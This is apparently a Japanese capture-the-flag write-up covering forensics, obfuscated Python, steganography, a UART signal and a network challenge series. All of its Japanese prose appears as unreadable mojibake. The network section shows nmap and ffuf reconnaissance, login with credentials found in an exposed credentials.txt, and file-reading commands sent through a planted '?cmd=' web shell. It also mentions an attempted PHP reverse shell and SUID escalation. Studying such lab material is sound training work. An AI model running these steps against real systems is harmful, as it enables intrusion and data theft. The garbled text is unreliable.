<p>ææ–™ã¯æƒã£ãŸã£ã½ã„ã®ã§å±•é–‹ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">% 7z x -p<span class="string">&#x27;Y0uCanF1ndTh1sPa$$w0rd&#x27;</span> file.0xe206bbc4a2f0.0xe206bbabada0.SharedCacheMap.Secrets.7z.vacb</span><br></pre></td></tr></table></figure>

<p><code>Secrets.rtf</code> ã¨ã„ã†ãƒ•ã‚¡ã‚¤ãƒ«ãŒã§ãã‚‹ã®ã§é–‹ãã¨ã€ã€ãƒ•ãƒ©ã‚°ãŒãªã„â€¦</p>
<p>ãªã„ã‚ã‘ãªã„ã§ã—ã‚‡ã€ãƒªãƒƒãƒãƒ†ã‚­ã‚¹ãƒˆã£ã¦ã“ã¨ã¯åè»¢ã§ã—ã‚‡</p>
<img src="/img/2024/02-25/Untitled%2018.png" width="auto" height="auto">

<p>ã„ãŸâ€¦</p>
<aside>
â›³ flag{you_cannot_find_this_secret!}

</aside>

<h2><span id="miscellaneous">Miscellaneous</span></h2><h3><span id="une-maison">Une Maison</span></h3><img src="/img/2024/02-25/Untitled%2019.png" width="550px" height="auto">

<p>æ·»ä»˜ç”»åƒã¯â†“</p>
<img src="/img/2024/02-25/Untitled%2020.png" width="auto" height="auto">

<p>ãƒãƒ¼ã‚³ãƒ¼ãƒ‰ã£ã½ã„â€¦ï¼Ÿ</p>
<p><a target="_blank" rel="noopener" href="https://www.aperisolve.com/">Aperiâ€™Solve</a></p>
<p>ã§è‰²å‘³ã‚’è½ã¨ã—ãŸã‚„ã¤ã‚’é©å½“ãªAndroidã‚¢ãƒ—ãƒªã®ãƒãƒ¼ã‚³ãƒ¼ãƒ‰ãƒªãƒ¼ãƒ€ãƒ¼ã§èª­ã‚“ã ã‚‰ã€èª­ã‚ãŸã€‚</p>
<aside>
â›³ flag{$50M!}

</aside>

<h3><span id="string-obfuscation">String Obfuscation</span></h3><img src="/img/2024/02-25/Untitled%2021.png" width="550px" height="auto">

<p>æ·»ä»˜ã‚³ãƒ¼ãƒ‰ã¯ã“ã‚Œã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">KEY = <span class="string">&quot;gobbledygook&quot;</span>.replace(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;oo&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;gk&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;y&quot;</span>, <span class="string">&quot;en&quot;</span>)</span><br><span class="line">**FLAG = <span class="built_in">chr</span>(<span class="number">51</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">120</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">52</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">84</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">68</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">51</span>)**</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == KEY:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag&#123;%s&#125;&quot;</span> % FLAG)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>FLAG</code> ã®ç®‡æ‰€ã‚’æ™®é€šã«è©•ä¾¡ã™ã‚Œã°OKã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">51</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">120</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">52</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">84</span>)+<span class="built_in">chr</span>(<span class="number">89</span>)+<span class="built_in">chr</span>(<span class="number">68</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">70</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">51</span>)</span><br><span class="line"><span class="string">&#x27;3FxYFm4uTYDFFzmb3&#x27;</span></span><br></pre></td></tr></table></figure>

<aside>
â›³ flag{3FxYFm4uTYDFFzmb3}

</aside>

<h3><span id="where-is-the-legit-flag">Where Is the Legit Flag?</span></h3><img src="/img/2024/02-25/Untitled%2022.png" width="550px" height="auto">

<p>ã‚³ãƒ¼ãƒ‰ã¯ã“ã‚Œã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">114</span>)+<span class="built_in">chr</span>(<span class="number">116</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">122</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">44</span>)+<span class="built_in">chr</span>(<span class="number">32</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">54</span>)+<span class="built_in">chr</span>(<span class="number">52</span>))</span><br><span class="line">**TANAKA = <span class="string">&quot;eJyNVG1320QT/Z5z8h+GhNYvcR35JZZdaCGhT6D0gQTiFKjjlpU0ljZe7272xYpoy2/vrJRA+MA56IOPrJ29e+feO7sP84JJ2CohsEqYELBlktsCWM64tA6E3+gKEjSm6u/uXBzPz+AZtBY/vRx91Unffv908vOrw9PXz7/E23h/nf2mtp9/Gz05fn9zbv8sB18f/P7DWa9o/5/1f/Hf6KMlhzfJ9YvZ/x4NKzk185PNF6vud3uf/Xjx0eV/PLsUvz4ev/tw1bq6au3u7MNxorYIK5Yi4K0WRAhWyoAuKstTJiDDlFuuZB9C9WvOwEq2RpBsg2CUlxk4Is5XPIXEMGubwlNqVpVc5mB9nqN1BAG2LjeYM5OFpRVumCAUTPF+31yVtAhb+oB0OLcsN4ikjUTmCih8jqCVoSODUpdvLl+9JK0W8fhJdBD1dnfg7pnG3UGPS9ceT7vdQYdW9uFstQLtjVYWQTBiwiwYb6hJ65jDDUpHoPcIYfP03ahTo4yG/Sg8zb/WaNwKkPel8QQeQ3R7etqLh/CB3qKoF8/gbfO2mBwtF9GypvDCm9D4WipHbYsKLCP1S4MuLTADmzISw6gyiHGP3h52euMY+ArmxpNLguhHNY/B8JBaG0TwCAaDnjJZOy1MezjpPCQ3ig6O7pQ4HHYJa9adLQMXOBfeglMIFp0jH0pOCm8ZBZJSialrHIGLQJECnFmwBQqSvqk0zLkKtFGZT5GEo9Iz7yzPSF3MLUhynYw0NpximLzxXISmWchCU39soWRiDZqRHE04eF64lRfAsi0n2JrCCdaomlXBowBGKU0qMtFQHNYYpmYfzgPzBAu25SHAiv65Jk1esoT6K9TmDhCON4psoLhT7FO1aXKfKhnOqR3ykjwq6Zs3pslFG8K+hqXVzKzJLWVSmuJ6gqxWQY7cMF0fEqRvtWjLpSTIJr3XWFKo00Jp6oXoZaiRVqklmh8RNAy7+uHnWhGhf33ai7/9DQ5xWfeRlJiA4wiKkl544yjYoZu7S2XBl38h/Ldd4SbglAZoJu3hoRRHDs9hHA+nT/9Bhp7EIFs//OhoRoej8WQSQxemo3h69HBV02mu7Q5H46M4no46tUPzgqTOC7jxiBIytiF6YAXXGk1Ve8YMt3WQls2OkyqEKQyzUXRBhYwqT83QQKGjJVtQbVN6pike3CFUoVIijV7SZMx6wk/CjUzXcfCxIbe3Eip/P91e46z0MtGz6fjjHmHt7nwCLpe/Qg==&quot;</span>**</span><br><span class="line">TAKAHASHI = [<span class="number">0x7a</span>,<span class="number">0x7a</span>,<span class="number">0x7a</span>,<span class="number">0x12</span>,<span class="number">0x18</span>,<span class="number">0x12</span>,<span class="number">0x1d</span>,<span class="number">0x12</span>,<span class="number">0x07</span>,<span class="number">0x7b</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x3c</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x31</span>,<span class="number">0x7d</span>,<span class="number">0x67</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0x20</span>,<span class="number">0x32</span>,<span class="number">0x31</span>,<span class="number">0x7b</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0x21</span>,<span class="number">0x23</span>,<span class="number">0x3e</span>,<span class="number">0x3c</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x7d</span>,<span class="number">0x31</span>,<span class="number">0x3a</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x7b</span>,<span class="number">0x30</span>,<span class="number">0x36</span>,<span class="number">0x2b</span>,<span class="number">0x36</span>]</span><br><span class="line"><span class="built_in">exec</span>(<span class="built_in">bytes</span>([WATANABE ^ <span class="number">0b01010011</span> <span class="keyword">for</span> WATANABE <span class="keyword">in</span> <span class="built_in">reversed</span>(TAKAHASHI)]))</span><br></pre></td></tr></table></figure>

<p>ã‚ã‚“ã©ãã•â€¦</p>
<p><code>TANAKA</code> ã‚’CyberChefã§Base64ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã¨ã€Zlibå±•é–‹ã™ã‚‹ã“ã¨ã¾ã§ææ¡ˆã—ã¦ãã‚ŒãŸã€‚</p>
<img src="/img/2024/02-25/Untitled%2023.png" width="auto" height="auto">

<p>å±•é–‹çµæœã¯ã“ã‚“ãªæ„Ÿã˜ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Than volleyball vanish against lumpy berry.</span></span><br><span class="line">SATO = <span class="string">&#x27;[QI3?)c^J:6RK/FV&gt;&lt;ex7#kdYov$G0-A&#123;qPs~w1@+`MO,h(La.WuCp5]i ZbjD9E%2yn8rTBm;f*H&quot;!NS&#125;tgz=UlX&amp;4_|\&#x27;\\&#x27;</span></span><br><span class="line"><span class="comment"># Above face explain for physical decision. </span></span><br><span class="line"><span class="comment"># Via snake name round terrific brass. </span></span><br><span class="line"><span class="comment"># Following suggestion sound regarding female recess. </span></span><br><span class="line"><span class="comment"># Toward vessel disagree beneath huge porter.</span></span><br><span class="line">SUZUKI = [<span class="number">74</span>-<span class="number">0</span>+<span class="number">0</span>,</span><br><span class="line">        <span class="number">87</span>*<span class="number">1</span>,<span class="built_in">int</span>(<span class="number">48</span>**<span class="number">1</span>),</span><br><span class="line"><span class="comment"># Off purpose land as rural statement.</span></span><br><span class="line">        <span class="built_in">int</span>(<span class="number">8_3</span>),<span class="built_in">int</span>(<span class="number">32.00000</span>),<span class="built_in">int</span>(<span class="string">&#x27;34&#x27;</span>),</span><br><span class="line">        <span class="number">76</span> &amp; <span class="number">0xFF</span>,<span class="number">72</span> | <span class="number">0x00</span>,<span class="number">79</span> ^ <span class="number">0x00</span>,[<span class="number">65</span>][<span class="number">0</span>],</span><br><span class="line"><span class="comment"># During knot rely save wretched scarecrow. </span></span><br><span class="line">        (<span class="number">2</span>),<span class="number">47</span> <span class="keyword">if</span> <span class="literal">True</span> <span class="keyword">else</span> <span class="number">0</span>,<span class="built_in">int</span>(<span class="number">12</span>/<span class="number">1</span>),<span class="number">10</span> % <span class="number">11</span>,<span class="built_in">ord</span>(<span class="built_in">chr</span>(<span class="number">26</span>)),</span><br><span class="line">        <span class="number">30</span>+<span class="number">5</span>,<span class="built_in">int</span>(<span class="number">48</span>/<span class="number">2</span>*<span class="number">2</span>),<span class="number">9</span>*<span class="number">9</span>]</span><br><span class="line"><span class="comment">#  Plus toe settle with vast insect. </span></span><br><span class="line"><span class="comment">#  Save hands shelter with ratty produce.</span></span><br><span class="line"><span class="comment">#  Outside legs nest versus tranquil relation.</span></span><br><span class="line"><span class="comment">#  As walk pat round rightful advice. </span></span><br><span class="line"><span class="comment"># Beside payment train by large key.</span></span><br><span class="line"><span class="comment"># Past behavior post toward unable home. </span></span><br><span class="line"><span class="comment">#  Among place complain considering unknown current.</span></span><br><span class="line">**( <span class="comment">#  Around spark scorch above spotty grape. </span></span><br><span class="line">    <span class="string">&#x27;&#x27;</span><span class="comment">#  Underneath jewel chop past dependent rifle.</span></span><br><span class="line">    .    join                          ([</span><br><span class="line">        <span class="comment">#  Since cobweb tie off hurt string.</span></span><br><span class="line">SATO[i]         <span class="comment">#  Since cobweb tie off hurt string.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> SUZUKI</span><br><span class="line">        <span class="comment"># if i &gt; 4728:</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment"># t = 234667 * 83785</span></span><br><span class="line">        <span class="comment"># print(t/3457783)</span></span><br><span class="line"><span class="comment">#  Through queen dam of slippery comparison.</span></span><br><span class="line">])**</span><br><span class="line"><span class="comment">#  By wall stroke without secret wash.</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">#  Opposite yoke need beside superb lumber. </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flog&#123;8vje9wunbp984&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¤ªå­—ã«ã—ãŸéƒ¨åˆ†ã€è©•ä¾¡ã¯ã—ã¦ã„ã‚‹ã‘ã©å‡ºåŠ›ã—ã¦ã„ãªã„ã€‚ã“ã‚Œã‚’printã—ã¦ã¿ã‚‹ã¨ãƒ•ãƒ©ã‚°ã€‚</p>
<aside>
â›³ flag{PHmN2ILK6vsa}

</aside>

<h3><span id="utter-darkness">Utter Darkness</span></h3><img src="/img/2024/02-25/Untitled%2024.png" width="550px" height="auto">

<p>ã‚¿ã‚¤ãƒˆãƒ«ã‹ã‚‰ã—ã¦ã‚¹ãƒ†ã‚¬ãƒã‚°ãƒ©ãƒ•ã‚£ãƒ¼ã€‚é’ç©ºç™½çŒ«ã«ã‹ã‘ã¦ãƒ•ã‚£ãƒ«ã‚¿ã‚’ãƒãƒãƒãƒã—ã¦ãŸã‚‰ãƒ•ãƒ©ã‚°ã€‚</p>
<aside>
â›³ flag{YjM5MDUyYzAxMj}

</aside>

<h3><span id="serial-port-signal-è§£ã‘ãªã‹ã£ãŸ">Serial Port Signal (è§£ã‘ãªã‹ã£ãŸ ğŸ˜­)</span></h3><img src="/img/2024/02-25/Untitled%2025.png" width="550px" height="auto">

<p>20ãƒã‚¤ã‚¯ãƒ­ç§’æ¯ã« 0&#x2F;1 ãŒä¸¦ã‚“ã CSVã€‚ãƒ¢ãƒ¼ãƒ«ã‚¹ã‹â€¦? ãƒ“ãƒƒãƒˆåˆ—â†’ASCIIã‹â€¦ï¼Ÿ</p>
<p>ã“ã­ãã‚Šå›ã—ãŸã‘ã©å…¨ç„¶ã†ã¾ãã„ã‹ãšã€ä¸¡æ–¹ã¨ã‚‚ãƒ’ãƒ³ãƒˆã‚’è¦‹ãŸã€‚</p>
<blockquote>
<p>ã‚·ãƒªã‚¢ãƒ«é€šä¿¡ã®æ–¹å¼ã¯ UART ã¦ã‚™ã™ã€‚</p>
</blockquote>
<blockquote>
<p>ãƒ›ã‚™ãƒ¼ãƒ¬ãƒ¼ãƒˆã¯ 9600ã€ãƒ†ã‚™ãƒ¼ã‚¿é•·ã¯ 7 bitã€ãƒã‚šãƒªãƒ†ã‚£ã¯å¶æ•°ã€ã‚¹ãƒˆãƒƒãƒ•ã‚šãƒ’ã‚™ãƒƒãƒˆã¯ 1 ã¦ã‚™ã™ã€‚</p>
</blockquote>
<p>æ®‹ã‚Šæ™‚é–“ã‚ãšã‹ã ã—ãƒ—ãƒ­ã‚°ãƒ©ãƒ æ›¸ããŸããªã„ã—ã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã®ãƒ‡ã‚³ãƒ¼ãƒ€ãƒ¼æ¢ã—ãŸã‚ŠCopilotã«é ‘å¼µã£ã¦ã‚‚ã‚‰ã£ãŸã‚Šã—ãŸã‘ã©ç„¡ç†ã ã£ãŸã€‚</p>
<hr>
<p>å…ˆäººã®writeupâ†“ã‚’æ‹è¦‹ã™ã‚‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/25/210059#Miscellaneous-30-Serial-Port-Signal-14-solves">é˜²è¡›çœã‚µã‚¤ãƒãƒ¼ã‚³ãƒ³ãƒ†ã‚¹ãƒˆ 2024 writeup - st98 ã®æ—¥è¨˜å¸³ - ã‚³ãƒ”ãƒ¼</a></p>
<p>è¨˜è¼‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆå®Ÿè¡Œã™ã‚‹ã¨ã€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JXXHello UART: synt&#123;IjUZC5TD&#125;</span><br></pre></td></tr></table></figure>

<p>ã®å‡ºåŠ›ãŒå‡ºã‚‹ã€‚ROT13ã£ã½ã„ã®ã§CyberChefã«ã‹ã‘ã‚‹ã¨ã€ãƒ•ãƒ©ã‚°ã€‚</p>
<aside>
â›³ flag{VwHMP5GQ}

</aside>

<h2><span id="network-nw">Network (NW)</span></h2><h3><span id="discovery">Discovery</span></h3><img src="/img/2024/02-25/Untitled%2026.png" width="550px" height="auto">

<p>ã¾ãšã¯nmapã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">% sudo nmap -sS -T4 <span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span></span><br><span class="line">Starting Nmap <span class="number">7.94</span> ( https://nmap.org ) at <span class="number">2024</span>-02-<span class="number">25</span> <span class="number">23</span>:<span class="number">16</span> JST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> schatzsuche.ctf (<span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span>)</span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.016</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  http</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">0.45</span> seconds</span><br></pre></td></tr></table></figure>

<p>HTTPãŒç©ºã„ã¦ã„ã‚‹ã®ã§ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã‚‹ã€‚</p>
<p><a target="_blank" rel="noopener" href="http://schatzsuche.ctf/">http://schatzsuche.ctf/</a> ã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã•ã‚Œã‚‹ã®ã§ã€ <code>/etc/hosts</code> ã«</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.21</span> schatzsuche.ctf</span><br></pre></td></tr></table></figure>

<p>ã‚’æ›¸ãè¶³ã—ã¦å†åº¦ã‚¢ã‚¯ã‚»ã‚¹ã€‚</p>
<p>è¦‹ãŸç›®çš„ã«ã‚‚ä½•ã‚‚ãªã„ã—å…¥åŠ›ç®‡æ‰€ã‚‚ãªã„ã€‚ffufã—ã¾ã™ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">% ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://schatzsuche.ctf/FUZZ</span><br><span class="line">...</span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">268</span>, Words: <span class="number">8</span>, Lines: <span class="number">6</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: .well-known/security.txt</span><br><span class="line"></span><br><span class="line">**[Status: <span class="number">301</span>, Size: <span class="number">162</span>, Words: <span class="number">5</span>, Lines: <span class="number">8</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: cmsadmin**</span><br><span class="line"></span><br><span class="line">**[Status: <span class="number">301</span>, Size: <span class="number">162</span>, Words: <span class="number">5</span>, Lines: <span class="number">8</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: ftp**</span><br><span class="line"></span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">428</span>, Words: <span class="number">67</span>, Lines: <span class="number">8</span>, Duration: 6ms]</span><br><span class="line">    * FUZZ: index.html</span><br><span class="line"></span><br><span class="line">[Status: <span class="number">200</span>, Size: <span class="number">4700</span>, Words: <span class="number">793</span>, Lines: <span class="number">141</span>, Duration: 7ms]</span><br><span class="line">    * FUZZ: robots.txt</span><br><span class="line"></span><br><span class="line">:: Progress: [<span class="number">4723</span>/<span class="number">4723</span>] :: Job [<span class="number">1</span>/<span class="number">1</span>] :: <span class="number">4347</span> req/sec :: Duration: [<span class="number">0</span>:<span class="number">00</span>:01] :: Errors: <span class="number">0</span> ::</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>&#x2F;ftp ã‚’è¾¿ã‚‹ã¨ã€ <code>credentials.txt</code> ãŒæ‰‹ã«å…¥ã‚‹ã€‚</p>
<p>ãã®ä¸­ã« &#x2F;cmsadmin ã®CMSã«å…¥ã‚Œã‚‹ID&#x2F;passãŒè¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ã®ã§ã€ãƒ­ã‚°ã‚¤ãƒ³ã™ã‚‹ã€‚</p>
<p>ãƒ¡ãƒ‹ãƒ¥ãƒ¼ã®infoçš„ãªã¨ã“ã‚ã‹ã‚‰ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãŒã‚ã‹ã‚‹ã€‚</p>
<aside>
â›³ flag{9.2.2.0, Revision: 14877}

</aside>

<h3><span id="exploit">Exploit</span></h3><img src="/img/2024/02-25/Untitled%2027.png" width="550px" height="auto">

<p>CMSã‚ˆã‚ã—ã .php ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã„ã˜ã‚Œã‚‹æ§˜å­ã€‚reverse shellã®PHPã‚’ä»•è¾¼ã‚‚ã†ã¨ã—ãŸã‘ã©ã€ä»•è¾¼ã‚“ã PHPã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã‚‚PHPã§å®Ÿè¡Œã•ã‚Œãšã«ãƒ™ã‚¿æ›¸ãHTMLã¨ã—ã¦é…ä¿¡ã•ã‚Œã¦ã„ã‚‹â€¦ï¼Ÿ</p>
<p>å‹•çš„å®Ÿè¡Œã®è¨­å®šã‚’å¤‰ãˆã‚ˆã†ã«ã‚‚ã€ä»Šã®IDã ã¨ãã®æ¨©é™ãŒãªã„æ¨¡æ§˜ã€‚</p>
<p>æ‚©ã‚“ã§ã„ã‚‹ã¨ã€è‡ªåˆ†ã®æ›¸ã„ãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒã©ã‚“ã©ã‚“æ›¸ãæ›ã‚ã‚‹ã€‚ã©ã†ã‚„ã‚‰ä»–ã®ãƒ—ãƒ¬ã‚¤ãƒ¤ãƒ¼ã¨åŒã˜ç’°å¢ƒã§ä¸Šæ›¸ãã—ã¾ãã£ã¦ã„ã‚‹ã‚ˆã†ã€‚ãªã‚“ãã‚Œï¼Ÿ</p>
<p>èª°ã‹ãŒä»•è¾¼ã‚“ã§ãã‚ŒãŸã€ãƒ•ã‚©ãƒ¼ãƒ ã« <code>?cmd=</code> ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼æ›¸ãã¨ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³å®Ÿè¡Œã—ã¦å‡ºåŠ›è¦‹ã›ã¦ãã‚‹ã‚„ã¤ã«é‹ã‚ˆãã‚¢ã‚¯ã‚»ã‚¹ã§ããŸã®ã§ã€</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;*.txt&#x27;</span></span><br><span class="line">cat /var/www/flag.txt</span><br></pre></td></tr></table></figure>

<p>ã—ã¦ãƒ•ã‚£ãƒ‹ãƒƒã‚·ãƒ¥ã€‚PHPå®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã®ã‚ã‚Œã©ã†ã‚„ã£ãŸã‚“ã ã‚ã†ï¼Ÿ</p>
<aside>
â›³ flag{G3t_R3v3rs3_Sh3ll}

</aside>

<h3><span id="pivot">Pivot</span></h3><img src="/img/2024/02-25/Untitled%2028.png" width="550px" height="auto">

<p>sshã§ãã‚‹ã€‚ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã« root ã‚ªãƒ¼ãƒŠãƒ¼ã®ãƒ•ãƒ©ã‚°ã‚ã‚‹ï¼ˆã‚‚ã¡ã‚ã‚“èª­ã‚ãªã„ï¼‰ã€‚</p>
<p>OSCPçŸ¥è­˜çš„ã«ã¯ linpeas åˆºã—ã¦å¼±ã„æ‰€è¦‹ã¤ã‘ã¦rootå–ã£ã¦çµ‚äº†ã€‚â€¦ ã¨æ€ã£ãŸã‚‰ã€ãªã‚“ã¨georgeã•ã‚“è‡ªåˆ†ã®ãƒ›ãƒ¼ãƒ ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚‚ <code>/tmp/</code> ã«ã‚‚æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã€‚ãã‚“ãªâ€¦</p>
<p>ã—ã‹ã—SUIDãƒ“ãƒƒãƒˆç«‹ã£ã¦ã‚‹å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã§rootãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã—ã¦ãƒ•ãƒ©ã‚°èª­ã‚€ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚‚OSCPã‚ã‚‹ã‚ã‚‹ã€‚</p>
